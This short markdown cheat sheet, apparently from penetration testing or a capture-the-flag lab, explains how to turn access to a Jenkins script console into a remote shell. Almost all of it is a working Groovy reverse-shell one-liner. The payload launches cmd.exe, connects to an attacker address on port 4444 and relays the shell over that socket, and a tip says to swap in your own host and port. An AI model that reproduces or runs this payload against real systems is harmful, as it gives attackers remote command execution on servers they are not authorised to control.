### Requirements: Access to the script console in Jenkins instance

#### 1) In  Jenkins dashboard, go to: Manage Jenkins -> Script console

#### 2) Setup Listener

#### 3) Run this payload from the console:

#### String host="10.10.14.97";int port=4444;String cmd="cmd.exe";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

### TIP: Don't forget to replace the host, port and cmd variables depending on use case!!!!
